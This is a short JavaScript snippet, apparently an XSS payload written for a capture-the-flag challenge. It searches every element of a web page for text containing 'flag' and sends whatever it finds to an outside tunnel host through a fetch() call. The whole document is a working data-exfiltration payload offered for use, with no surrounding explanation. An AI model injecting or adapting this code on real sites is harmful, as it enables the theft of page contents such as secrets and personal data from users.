function hack() {
        const allElements = document.getElementsByTagName('*');
        let flagContent = '';
        
        for (let i = 0; i < allElements.length; i++) {
            const element = allElements[i];
            if (element.textContent && element.textContent.toLowerCase().includes('flag')) {
                flagContent += element.textContent + '\n';
            }
        }
        fetch('https://141ed2cf.r9.cpolar.cn/?flag=' + encodeURIComponent(flagContent))
      }
hack()
